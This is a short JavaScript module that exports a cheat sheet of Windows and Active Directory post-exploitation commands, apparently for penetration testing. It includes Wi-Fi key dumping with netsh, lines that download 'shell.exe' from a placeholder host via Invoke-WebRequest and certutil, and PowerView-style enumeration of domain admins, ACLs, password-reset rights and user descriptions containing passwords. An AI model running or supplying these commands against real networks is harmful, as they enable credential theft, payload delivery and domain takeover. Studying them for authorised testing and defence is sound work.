var o={
	 local_sys_enum:[
		{ title: 'systeminfo' },
		{ title: 'Get-WmiObject Win32_ComputerSystem' },
		{ title: 'echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"' }
	],
lastpatchlist:'Get-Hotfix -description "Security update"',
lastpatchlist_wmic:'wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn',
envVar:'Get-ChildItem Env: | ft Key,Value',
envVar_cmd:'set',
wlan_creddump:[
		{ title: 'netsh wlan show profiles' },
		{ title: 'netsh wlan show profile name="PROFILE-NAME" key=clear' }
	],
powershell_http_dl:' Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ',
cmd_cert_http_dl:'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe',
domain_name:`Get-NetDomain`,
forest_domain_list:`Get-NetForestDomain`,
domain_SID:`Get-DomainSID `,
domain_Policy:`Get-DomainPolicy`,
domain_OUs:`Get-NetOU`,
domain_trust:`Get-NetDomainTrust`,
gpo_enum:`Get-NetGPO -ComputerName computername.domain.com`,
passwd_lastset:`Get-UserProperty –Properties pwdlastset`,
user_desc_harvest:`Find-UserField -SearchField Description –SearchTerm “pass”`,
domain_computers:`Get-NetComputer`,
domain_pingable_computers:`Get-NetComputer -Ping`,
domain_win7U_computers:`Get-NetComputer –OperatingSystem "Windows 7 Ultimate"`,
domain_admin_members:`Get-NetGroupMember -GroupName "Domain Admins"`,
domain_admins_groups:`Get-NetGroup *admin*`,
local_admins:`Get-NetLocalGroup –ComputerName PCNAME-001`,
user_group_membership:`Get-NetGroup –UserName "username"`,
ACL_user_enum:`Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`,
ACL_gpoedit_rights:`Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`,
ACL_passwd_edit_rights:`Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"`};
module.exports=o;
// console.log(o)